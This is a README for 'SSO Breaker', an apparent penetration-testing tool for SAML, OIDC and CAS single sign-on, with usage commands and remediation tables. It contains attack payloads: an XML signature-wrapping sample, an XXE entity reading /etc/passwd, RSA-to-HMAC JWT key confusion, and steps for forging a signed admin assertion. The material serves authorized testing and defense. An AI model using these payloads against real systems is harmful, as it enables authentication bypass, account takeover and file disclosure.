<div align="center">

# 🔓 SSO Breaker

### Production-Grade SSO/SAML/OIDC/CAS Security Testing Tool

[![Python 3.8+](https://img.shields.io/badge/python-3.8+-blue.svg)](https://www.python.org/downloads/)
[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](LICENSE)
[![PRs Welcome](https://img.shields.io/badge/PRs-welcome-brightgreen.svg)](CONTRIBUTING.md)

<p align="center">
  <strong>Real XML-DSIG Signing · JWKS Key Confusion · Baseline Detection · Auto-Discovery</strong>
</p>

<p align="center">
  <a href="#-quick-start">Quick Start</a> •
  <a href="#-attack-modules">Attack Modules</a> •
  <a href="#-usage-examples">Usage</a> •
  <a href="#-documentation">Docs</a> •
  <a href="#%EF%B8%8F-legal-disclaimer">Disclaimer</a>
</p>

</div>

---

## ⚠️ Legal Disclaimer

> **This tool is designed for authorized security testing and research ONLY.**
>
> You MUST have explicit written permission from the system owner before
> running any tests. Unauthorized access to computer systems is illegal
> under the Computer Fraud and Abuse Act (CFAA), the Computer Misuse Act,
> and equivalent laws in most jurisdictions.
>
> The authors assume no liability for misuse of this software.
> **You are solely responsible for your actions.**

---

## 📖 Overview

SSO Breaker is a comprehensive security testing tool that identifies
vulnerabilities in Single Sign-On implementations across three major
protocols:

| Protocol | Attacks | Key Capabilities |
|----------|---------|-------------------|
| **SAML 2.0** | 15 tests | Real XML-DSIG signing, all 8 XSW variants, XXE, XSLT injection |
| **OIDC/OAuth2** | 8 tests | JWKS auto-discovery, RSA→HMAC key confusion, alg:none bypass |
| **CAS** | 3 tests | Ticket reuse, service URL manipulation, proxy abuse |
| **General SSO** | 4 tests | Account linking, email bypass, provider confusion |

### What Makes This Different

| Feature | SSO Breaker | SAMLRaider | jwt_tool | Manual Testing |
|---------|:-----------:|:----------:|:-------:|:--------------:|
| Real XML-DSIG (C14N + RSA-SHA256) | ✅ | ✅ | — | ❌ |
| OIDC .well-known auto-discovery | ✅ | — | ✅ | ❌ |
| RSA→HMAC key confusion from JWKS | ✅ | — | ✅ | ❌ |
| Baseline-calibrated detection | ✅ | ❌ | ❌ | ❌ |
| SSO flow auto-detection | ✅ | ❌ | ❌ | ❌ |
| SAML metadata auto-parsing | ✅ | ✅ | — | ❌ |
| All 8 XSW variants | ✅ | ✅ | — | ❌ |
| Rate limiting + backoff | ✅ | ❌ | ❌ | ✅ |
| Scope validation prompt | ✅ | ❌ | ❌ | ✅ |
| CLI + JSON/text reports | ✅ | ❌ | ✅ | ❌ |
| No Burp Suite required | ✅ | ❌ | ✅ | ❌ |

---

## 🚀 Quick Start

### Installation

```bash
# Clone the repository
git clone https://github.com/yourusername/sso-breaker.git
cd sso-breaker

# Create virtual environment (recommended)
python3 -m venv venv
source venv/bin/activate  # Linux/Mac
# venv\Scripts\activate   # Windows

# Install dependencies
pip install -r requirements.txt
```

### Requirements

```
# requirements.txt
requests>=2.31.0
urllib3>=2.0.0
cryptography>=41.0.0
PyJWT>=2.8.0
lxml>=4.9.0
colorama>=0.4.6
```

### Verify Installation

```bash
python sso_breaker.py --help
```

### First Scan

```bash
# Basic SAML test against an ACS endpoint
python sso_breaker.py \
    -t https://app.example.com \
    --module saml \
    --acs-url https://app.example.com/saml/acs \
    --idp-entity-id https://idp.example.com

# OIDC with auto-discovery (recommended)
python sso_breaker.py \
    -t https://app.example.com \
    --module oidc \
    --oidc-discovery-url https://auth.example.com
```

---

## 🗡️ Attack Modules

### Module 1: SAML 2.0 Attacks (15 Tests)

#### XML Signature Wrapping (XSW) — Variants 1-8

The core SAML attack. SSO Breaker implements all 8 known XSW variants
that exploit how Service Providers validate XML digital signatures versus
which assertion they actually consume for authentication.

```
┌─────────────────────────────────────────────────────────────┐
│  How XSW Works                                              │
│                                                             │
│  1. Attacker captures a legitimately signed SAML Response   │
│  2. Tool creates an evil assertion (admin@target.com)       │
│  3. XML is restructured so:                                 │
│     • Signature validates against the ORIGINAL assertion    │
│     • SP processes the EVIL assertion for authentication    │
│  4. Result: authentication bypass → account takeover        │
└─────────────────────────────────────────────────────────────┘
```

| Variant | Technique | XML Structure |
|---------|-----------|---------------|
| XSW-1 | Evil before original, original in wrapper | `<Evil/> ... <Wrapper><Original+Sig/></Wrapper>` |
| XSW-2 | Evil replaces original, original in Extensions | `<Evil/> ... <Extensions><Original+Sig/></Extensions>` |
| XSW-3 | Evil wraps original as child | `<Evil><OriginalAssertion><Original+Sig/></OriginalAssertion></Evil>` |
| XSW-4 | Original in Extensions, evil as sibling | `<Extensions><Original+Sig/></Extensions> <Evil/>` |
| XSW-5 | Original in ds:Object inside evil's Signature | `<Evil><ds:Signature><ds:Object><Original/></ds:Object></ds:Signature></Evil>` |
| XSW-6 | Original in Advice element | `<Evil><Advice><Original+Sig/></Advice></Evil>` |
| XSW-7 | Evil nested in signed assertion's Extensions | `<Original+Sig><Extensions><Evil/></Extensions></Original+Sig>` |
| XSW-8 | Evil at top, original in nested Response | `<Evil/> <Response><Original+Sig/></Response>` |

**Best results:** Provide a captured SAML response via `--saml-response`

#### Other SAML Attacks

| Attack | Severity | Description |
|--------|----------|-------------|
| **Assertion Replay** | HIGH | Same assertion accepted multiple times |
| **Response Tampering** | CRITICAL | Modified NameID accepted without re-validation |
| **Comment Injection** | CRITICAL | XML comments in NameID bypass string comparison |
| **XSLT Injection** | CRITICAL | XSLT transform in ds:Transforms replaces assertion |
| **XXE Injection** | CRITICAL | External entity resolution (file read, SSRF) |
| **Signature Exclusion** | CRITICAL | Assertion accepted with signature removed entirely |
| **Certificate Faking** | CRITICAL | Assertion signed with attacker cert accepted (real XML-DSIG) |

#### Certificate Faking — Real XML-DSIG

Unlike other tools that stuff random bytes into signature fields,
SSO Breaker performs **real XML digital signature operations**:

```
1. Generate RSA-2048 keypair + self-signed X.509 certificate
2. Build evil SAML assertion (admin@target.com)
3. Compute Exclusive C14N canonicalization of assertion
4. SHA-256 digest of canonicalized content
5. Build SignedInfo with proper Reference URI
6. Exclusive C14N canonicalization of SignedInfo
7. RSA-PKCS1v15-SHA256 signature over canonicalized SignedInfo
8. Embed certificate in ds:KeyInfo/ds:X509Data
9. Self-verify signature correctness before sending
```

This produces a **cryptographically valid** signed assertion. If the SP
trusts any certificate (doesn't pin the IdP cert), it will validate
successfully.

---

### Module 2: OIDC/OAuth2 Attacks (8 Tests)

#### Auto-Discovery

When you provide `--oidc-discovery-url`, the tool automatically:

```
1. Fetches /.well-known/openid-configuration
2. Extracts authorization_endpoint, token_endpoint, userinfo_endpoint
3. Fetches JWKS from jwks_uri
4. Converts RSA JWK keys to PEM format
5. Uses public keys for HMAC key confusion attacks
```

#### Attack Details

| Attack | Severity | Description |
|--------|----------|-------------|
| **Algorithm None** | CRITICAL | JWT with `alg: "none"` + empty signature (5 case variants) |
| **HMAC Key Confusion** | CRITICAL | Sign HS256 JWT using RSA public key from JWKS as HMAC secret |
| **Nonce Replay** | HIGH | Same nonce accepted across multiple authorization requests |
| **Issuer Confusion** | CRITICAL | Forged `iss` claim accepted (8 bypass variants) |
| **Audience Bypass** | HIGH | Wrong/empty/wildcard `aud` claim accepted |
| **Token Substitution** | HIGH | Stolen auth code + wrong redirect_uri accepted |
| **Mix-Up Attack** | HIGH | Cross-IdP code injection via evil issuer parameter |
| **Claim Injection** | HIGH | Extra admin claims (is_admin, role) honored |

#### RSA→HMAC Key Confusion — How It Works

```
┌────────────────────────────────────────────────────────────┐
│  Normal Flow:                                              │
│  IdP signs JWT with RSA private key (RS256)                │
│  RP verifies with RSA public key from JWKS                 │
│                                                            │
│  Attack Flow:                                              │
│  1. Attacker downloads RSA public key from JWKS endpoint   │
│  2. Creates evil JWT with alg: "HS256"                     │
│  3. Signs JWT using RSA public key PEM as HMAC secret      │
│  4. RP sees alg=HS256, uses "the key" to verify            │
│  5. If RP uses same key object for both RSA+HMAC → valid!  │
│  6. Attacker can forge any JWT claims                      │
└────────────────────────────────────────────────────────────┘
```

---

### Module 3: CAS Attacks (3 Tests)

| Attack | Severity | Description |
|--------|----------|-------------|
| **Service Ticket Reuse** | HIGH | Same ST accepted for multiple validations |
| **Service URL Manipulation** | HIGH | Open redirect via unvalidated `service` parameter (16 payloads) |
| **Proxy Ticket Abuse** | HIGH | Unauthorized pgtUrl accepted for proxy granting |

---

### Module 4: General SSO (4 Tests)

| Attack | Severity | Description |
|--------|----------|-------------|
| **Account Linking Abuse** | HIGH | Arbitrary provider claims accepted for account linking |
| **Email Verification Bypass** | CRITICAL | SSO login bypasses email_verified requirement |
| **SSO→Non-SSO Takeover** | CRITICAL | SSO login takes over existing password-based account |
| **Provider Confusion** | HIGH | Cross-provider identity swapping accepted |

---

## 📋 Usage Examples

### SAML Testing

```bash
# Basic — tool generates synthetic SAML responses
python sso_breaker.py \
    -t https://app.example.com \
    --module saml \
    --acs-url https://app.example.com/saml/acs

# With captured SAML response (RECOMMENDED for XSW attacks)
# Capture via Burp Suite: intercept POST to ACS, copy SAMLResponse value
python sso_breaker.py \
    -t https://app.example.com \
    --module saml \
    --acs-url https://app.example.com/saml/acs \
    --saml-response "PHNhbWxwOlJlc3BvbnNlIH..."

# Auto-configure from IdP metadata
python sso_breaker.py \
    -t https://app.example.com \
    --module saml \
    --acs-url https://app.example.com/saml/acs \
    --saml-metadata-url https://idp.example.com/metadata

# Full SAML configuration
python sso_breaker.py \
    -t https://app.example.com \
    --module saml \
    --acs-url https://app.example.com/saml/acs \
    --sp-entity-id https://app.example.com \
    --idp-entity-id https://idp.example.com \
    --saml-response "PHNhbWxwOl..."
```

### OIDC Testing

```bash
# Auto-discovery (recommended — finds all endpoints + JWKS automatically)
python sso_breaker.py \
    -t https://app.example.com \
    --module oidc \
    --oidc-discovery-url https://auth.example.com

# Manual endpoint configuration
python sso_breaker.py \
    -t https://app.example.com \
    --module oidc \
    --oidc-auth-endpoint https://auth.example.com/authorize \
    --oidc-token-endpoint https://auth.example.com/token \
    --oidc-userinfo-endpoint https://auth.example.com/userinfo \
    --oidc-client-id my_client_id \
    --oidc-client-secret my_client_secret \
    --oidc-redirect-uri https://app.example.com/callback

# With captured ID token (for targeted manipulation)
python sso_breaker.py \
    -t https://app.example.com \
    --module oidc \
    --oidc-discovery-url https://auth.example.com \
    --id-token "eyJhbGciOiJSUzI1NiIs..."

# JWKS URI override (if not in .well-known)
python sso_breaker.py \
    -t https://app.example.com \
    --module oidc \
    --oidc-discovery-url https://auth.example.com \
    --oidc-jwks-uri https://auth.example.com/.well-known/jwks.json
```

### CAS Testing

```bash
python sso_breaker.py \
    -t https://app.example.com \
    --module cas \
    --cas-login-url https://cas.example.com/cas/login \
    --cas-validate-url https://cas.example.com/cas/serviceValidate \
    --cas-service-url https://app.example.com
```

### Full Scan (All Modules)

```bash
python sso_breaker.py \
    -t https://app.example.com \
    --module all \
    --acs-url https://app.example.com/saml/acs \
    --oidc-discovery-url https://auth.example.com \
    --cas-login-url https://cas.example.com/login \
    -o report.json \
    --format json
```

### Advanced Options

```bash
# Through Burp proxy with custom headers and cookies
python sso_breaker.py \
    -t https://app.example.com \
    --module all \
    --acs-url https://app.example.com/saml/acs \
    --proxy http://127.0.0.1:8080 \
    -c "session=abc123def456" \
    -c "csrf_token=xyz789" \
    -H "X-Custom-Header: value" \
    -H "Authorization: Bearer existing_token" \
    --rate-limit 1.0 \
    --timeout 45 \
    --no-verify-ssl \
    -v

# Skip scope confirmation (CI/CD pipelines)
python sso_breaker.py \
    -t https://app.example.com \
    --module saml \
    --acs-url https://app.example.com/saml/acs \
    --skip-scope-check \
    -o results.json \
    --format json
```

---

## 🏗️ Architecture

```
sso_breaker.py
│
├── Infrastructure Layer
│   ├── RateLimiter          — Exponential backoff between requests
│   ├── ScopeValidator       — Authorization confirmation before testing
│   ├── SSOFlowHandler       — Follow redirect chains, detect SSO type
│   └── BaselineDetector     — Calibrated success/failure detection
│
├── Cryptography Layer
│   ├── XMLDSigSigner        — Real C14N + RSA-SHA256 XML signatures
│   ├── CertForger           — Generate attacker X.509 certificates
│   └── OIDCDiscovery        — JWKS fetch + JWK-to-PEM conversion
│
├── Protocol Parsers
│   ├── SAMLMetadataParser   — Extract endpoints from IdP metadata XML
│   ├── SAMLBuilder          — Construct/encode/decode SAML responses
│   └── OIDCDiscovery        — .well-known/openid-configuration parser
│
├── Attack Modules
│   ├── SAMLAttacker         — 15 SAML attack implementations
│   ├── OIDCAttacker         — 8 OIDC/OAuth2 attack implementations
│   ├── CASAttacker          — 3 CAS protocol attacks
│   └── GeneralSSOAttacker   — 4 cross-protocol SSO attacks
│
├── Session Management
│   └── AttackSession        — Shared HTTP session, cookies, proxy, findings
│
└── Reporting
    └── ReportGenerator      — Text and JSON report output
```

### Detection System — How Baseline Calibration Works

```
┌─────────────────────────────────────────────────────────────┐
│  Step 1: Send 4 invalid SAML responses to ACS              │
│  ├── <invalid/>                                             │
│  ├── not-xml                                                │
│  ├── (empty)                                                │
│  └── <Response>broken</Response>                            │
│                                                             │
│  Step 2: Record baseline characteristics                    │
│  ├── Most common HTTP status code (typically 400 or 302)    │
│  ├── Average response body length                           │
│  ├── Cookies set on error                                   │
│  ├── Redirect Location on error                             │
│  └── Error keywords present (error, invalid, denied, etc.)  │
│                                                             │
│  Step 3: Compare attack responses against baseline          │
│  ├── Different status code?            → +1 indicator       │
│  ├── New session cookie set?           → STRONG indicator   │
│  ├── Response length changed >30%?     → +1 indicator       │
│  ├── Redirect changed from /login?     → +1 indicator       │
│  └── Error keywords disappeared?       → +1 indicator       │
│                                                             │
│  Step 4: Success = session cookie OR ≥2 indicators          │
└─────────────────────────────────────────────────────────────┘
```

---

## 📊 Report Output

### Text Report (default)

```
══════════════════════════════════════════════════════════════
  SSO SECURITY ASSESSMENT REPORT
══════════════════════════════════════════════════════════════
  Date: 2024-01-15 14:30:22 UTC
  Total: 3
  CRITICAL: 2
  HIGH: 1
══════════════════════════════════════════════════════════════

─── Finding #1 ───
  Title:       SAML Certificate Faking — Attacker-Signed
  Severity:    CRITICAL
  Attack:      CERT-FAKE
  CVSS:        CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N (9.1)
  Description: SP accepted properly-signed assertion from attacker
               certificate. No certificate pinning or trust validation.
  Evidence:    new_session_cookies:['session_id']; status:400→302
  Fix:         Pin IdP certificates. Do not trust embedded certs.
```

### JSON Report

```bash
python sso_breaker.py -t https://app.example.com --module saml \
    --acs-url https://app.example.com/saml/acs \
    -o report.json --format json
```

```json
{
  "date": "2024-01-15T14:30:22.000000",
  "total": 3,
  "findings": [
    {
      "title": "SAML Certificate Faking — Attacker-Signed",
      "severity": "CRITICAL",
      "description": "SP accepted properly-signed assertion...",
      "evidence": "new_session_cookies:['session_id']",
      "remediation": "Pin IdP certificates.",
      "attack_type": "CERT-FAKE",
      "cvss_estimate": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N (9.1)"
    }
  ]
}
```

---

## 🔧 CLI Reference

```
usage: sso_breaker.py [-h] -t TARGET [--module {saml,oidc,cas,general,all}]
                      [--skip-scope-check]

SAML Options:
  --acs-url             Assertion Consumer Service URL
  --sp-entity-id        Service Provider Entity ID
  --idp-entity-id       Identity Provider Entity ID
  --saml-endpoint       SAML SSO endpoint URL
  --saml-response       Base64-encoded captured SAML response
  --saml-metadata-url   SAML IdP metadata URL for auto-configuration

OIDC Options:
  --oidc-discovery-url  OIDC issuer URL for .well-known auto-discovery
  --oidc-auth-endpoint  Authorization endpoint (auto-discovered if not set)
  --oidc-token-endpoint Token endpoint (auto-discovered if not set)
  --oidc-userinfo-endpoint UserInfo endpoint (auto-discovered if not set)
  --oidc-jwks-uri       JWKS URI (auto-discovered if not set)
  --oidc-client-id      OAuth2 client ID
  --oidc-client-secret  OAuth2 client secret
  --oidc-redirect-uri   OAuth2 redirect URI
  --id-token            Captured JWT ID token for targeted attacks

CAS Options:
  --cas-login-url       CAS server login URL
  --cas-validate-url    CAS ticket validation URL
  --cas-service-url     CAS service URL

General Options:
  --proxy               HTTP proxy URL (e.g., http://127.0.0.1:8080)
  --timeout             Request timeout in seconds (default: 30)
  --rate-limit          Minimum seconds between requests (default: 0.5)
  --no-verify-ssl       Disable SSL certificate verification
  -c, --cookie          Cookie as name=value (repeatable)
  -H, --header          Header as Name: Value (repeatable)
  -o, --output          Output report file path
  --format              Report format: text or json (default: text)
  -v, --verbose         Enable debug logging
```

---

## 🎯 Testing Workflow

### Recommended approach for maximum coverage:

```
Step 1: Reconnaissance
├── Identify SSO type (SAML/OIDC/CAS)
├── Find ACS URL, IdP metadata, OIDC discovery endpoint
└── Note any existing session cookies

Step 2: Capture legitimate traffic
├── SAML: Intercept SAMLResponse via Burp Suite
├── OIDC: Capture ID token from browser devtools
└── CAS: Note service ticket format

Step 3: Run SSO Breaker
├── Start with --module saml --saml-response <captured>
├── Then --module oidc --oidc-discovery-url <issuer>
├── Then --module cas if applicable
└── Finally --module general

Step 4: Validate findings
├── Each finding includes evidence and indicators
├── Manually verify CRITICAL findings
└── Check for false positives using evidence details

Step 5: Report
└── Use -o report.json --format json for structured output
```

### Capturing a SAML Response (Burp Suite)

```
1. Configure browser to use Burp proxy
2. Initiate SSO login to target application
3. Authenticate at the IdP
4. In Burp → Proxy → HTTP History, find the POST to the ACS URL
5. Copy the SAMLResponse parameter value (base64-encoded)
6. Pass it to: --saml-response "PHNhbWxwOl..."
```

### Capturing a SAML Response (Browser DevTools)

```
1. Open browser DevTools → Network tab
2. Check "Preserve log"
3. Initiate SSO login
4. Find the POST request to the ACS endpoint
5. In Form Data, copy SAMLResponse value
```

---

## 🧪 Self-Test Verification

The tool includes a built-in signature self-verification mechanism:

```
When certificate_faking() runs:
1. Generates RSA-2048 keypair
2. Builds SAML assertion with evil claims
3. Signs assertion with real XML-DSIG (C14N + RSA-SHA256)
4. Signs response with real XML-DSIG
5. SELF-VERIFIES: recomputes digest + validates signature
6. Logs: "[CERT-FAKE] Self-verification: PASS"
7. Only then submits to target

If self-verification fails, the tool logs FAIL so you know
the signature implementation has an issue.
```

---

## 📁 Project Structure

```
sso-breaker/
├── sso_breaker.py          # Main tool (single-file, no external deps beyond pip)
├── requirements.txt        # Python dependencies
├── README.md               # This file
├── LICENSE                  # MIT License
├── CONTRIBUTING.md          # Contribution guidelines
├── CHANGELOG.md            # Version history
├── docs/
│   ├── SAML_ATTACKS.md     # Detailed SAML attack documentation
│   ├── OIDC_ATTACKS.md     # Detailed OIDC attack documentation
│   ├── CAS_ATTACKS.md      # Detailed CAS attack documentation
│   ├── DETECTION.md        # How baseline detection works
│   └── XMLDSIG.md          # XML-DSIG implementation details
└── examples/
    ├── sample_saml_response.xml
    ├── sample_oidc_config.json
    └── ci_pipeline.yml
```

---

## 🔬 How Each Attack Works (Technical Deep Dive)

### SAML: XML Signature Wrapping Variant 1

```xml
<!-- ORIGINAL (captured from real IdP) -->
<samlp:Response ID="_resp_abc">
  <saml:Assertion ID="_assert_123">     ← Signed assertion
    <ds:Signature>
      <ds:Reference URI="#_assert_123"/>  ← Signature covers THIS ID
    </ds:Signature>
    <saml:NameID>user@example.com</saml:NameID>
  </saml:Assertion>
</samlp:Response>

<!-- AFTER XSW-1 MANIPULATION -->
<samlp:Response ID="_resp_abc">
  <saml:Assertion ID="_evil_456">       ← SP processes THIS (first assertion)
    <saml:NameID>admin@target.com</saml:NameID>  ← Evil claims
  </saml:Assertion>
  <saml:Wrapper>
    <saml:Assertion ID="_assert_123">   ← Signature validates against THIS
      <ds:Signature>
        <ds:Reference URI="#_assert_123"/>
      </ds:Signature>
      <saml:NameID>user@example.com</saml:NameID>
    </saml:Assertion>
  </saml:Wrapper>
</samlp:Response>
```

### OIDC: RSA→HMAC Key Confusion

```python
# Normal: IdP signs with RSA private key, RP verifies with RSA public key
#   IdP: jwt.sign(claims, RSA_PRIVATE_KEY, algorithm="RS256")
#   RP:  jwt.verify(token, RSA_PUBLIC_KEY, algorithms=["RS256"])

# Attack: Attacker uses RSA public key (from JWKS) as HMAC secret
#   Attacker: jwt.sign(evil_claims, RSA_PUBLIC_KEY_PEM, algorithm="HS256")
#   RP:       jwt.verify(token, RSA_PUBLIC_KEY, algorithms=["RS256", "HS256"])
#                                                           ↑ BUG: allows HS256
#   Since HS256 verification uses the same key for sign+verify,
#   and attacker has the public key, verification succeeds!
```

### SAML: XXE Injection

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<samlp:Response>
  <saml:Assertion>
    <saml:Subject>
      <saml:NameID>&xxe;</saml:NameID>  ← Resolves to file contents
    </saml:Subject>
  </saml:Assertion>
</samlp:Response>
```

---

## 🛡️ Remediation Guide

### SAML Fixes

| Vulnerability | Fix |
|---------------|-----|
| XSW (all variants) | Verify signed element ID matches the assertion used for authn. Use strict XPath. Reject multiple assertions. |
| Signature Exclusion | Always require signatures. Reject unsigned assertions. |
| Certificate Faking | Pin IdP certificate fingerprint. Never trust certs embedded in SAML response. |
| XXE | Use `defusedxml` or disable external entity processing in XML parser. |
| XSLT Injection | Reject XSLT transform algorithm. Whitelist only `exc-c14n` and `enveloped-signature`. |
| Comment Injection | Canonicalize NameID text content before comparison. Strip comments. |
| Replay | Cache assertion IDs. Reject duplicates. Enforce `NotOnOrAfter`. |

### OIDC Fixes

| Vulnerability | Fix |
|---------------|-----|
| alg:none | Reject `none` algorithm. Whitelist only expected algorithms (RS256). |
| Key Confusion | Bind algorithms to specific keys. Never accept HS256 on RSA keys. |
| Issuer Confusion | Strictly compare `iss` claim against expected issuer string. |
| Audience Bypass | Validate `aud` contains exactly this RP's `client_id`. |
| Nonce Replay | Bind nonce to session. Reject reused nonces. |

### CAS Fixes

| Vulnerability | Fix |
|---------------|-----|
| Ticket Reuse | Implement one-time-use tickets. Invalidate after first validation. |
| Service URL | Whitelist allowed service URLs. Use exact string matching. |
| Proxy Abuse | Restrict `pgtUrl` to registered callback URLs. |

---

## 🔄 Exit Codes

| Code | Meaning |
|------|---------|
| `0` | No vulnerabilities found |
| `1` | One or more vulnerabilities found |

Useful for CI/CD integration:

```bash
python sso_breaker.py -t https://app.example.com --module all \
    --skip-scope-check -o report.json --format json

if [ $? -eq 1 ]; then
    echo "SSO vulnerabilities detected!"
    # Send alert, fail pipeline, etc.
fi
```

---

## 🤝 Contributing

See [CONTRIBUTING.md](CONTRIBUTING.md) for guidelines.

Key areas where contributions are welcome:

- Additional XSW variants for SAML 1.1
- WS-Federation attack module
- Selenium/Playwright integration for interactive flows
- Additional OIDC attack vectors (PKCE downgrade, etc.)
- Improved detection heuristics
- Unit and integration tests

---

## 📜 Changelog

### v2.1 (Current)
- Real XML-DSIG signing with C14N + RSA-SHA256
- OIDC .well-known auto-discovery + JWKS extraction
- RSA→HMAC key confusion attack
- Baseline-calibrated success detection
- SAML metadata auto-parsing
- SSO flow auto-detection
- Rate limiting with exponential backoff
- Scope validation prompt
- Self-test signature verification
- CVSS score estimates on findings

### v2.0
- Architecture rewrite
- All 8 XSW variants
- Basic OIDC attacks

### v1.0
- Initial release
- Synthetic SAML responses only
- Heuristic detection

---

## 📚 References

- [SAML Security Cheat Sheet (OWASP)](https://cheatsheetseries.owasp.org/cheatsheets/SAML_Security_Cheat_Sheet.html)
- [On Breaking SAML (Somorovsky et al.)](https://www.usenix.org/conference/usenixsecurity12/technical-sessions/presentation/somorovsky)
- [JWT Attack Playbook](https://github.com/ticarpi/jwt_tool/wiki)
- [OAuth 2.0 Security Best Practices (RFC 9700)](https://datatracker.ietf.org/doc/html/rfc9700)
- [XML Signature Wrapping Attacks](https://www.ws-attacks.org/XML_Signature_Wrapping)
- [CAS Protocol Specification](https://apereo.github.io/cas/development/protocol/CAS-Protocol-Specification.html)

---

## 📄 License

MIT License — see [LICENSE](LICENSE) for details.

---

<div align="center">

**Built for security professionals. Use responsibly.**

</div>
